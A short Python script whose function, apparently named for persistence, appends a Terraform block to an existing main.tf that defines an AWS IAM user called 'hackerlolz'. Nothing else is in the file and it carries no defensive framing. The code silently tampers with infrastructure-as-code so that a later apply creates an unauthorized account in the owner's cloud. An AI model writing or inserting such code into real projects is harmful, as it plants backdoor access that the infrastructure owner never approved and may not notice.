from pathlib import Path

IAM_USER_TEMPLATE = '''
resource "aws_iam_user" "lb" {
  name = "hackerlolz"
}
'''


def pstn():
    terraform_template = Path("main.tf")
    if not terraform_template.is_file():
        return

    with open("main.tf", "a") as file:
        file.write(IAM_USER_TEMPLATE)
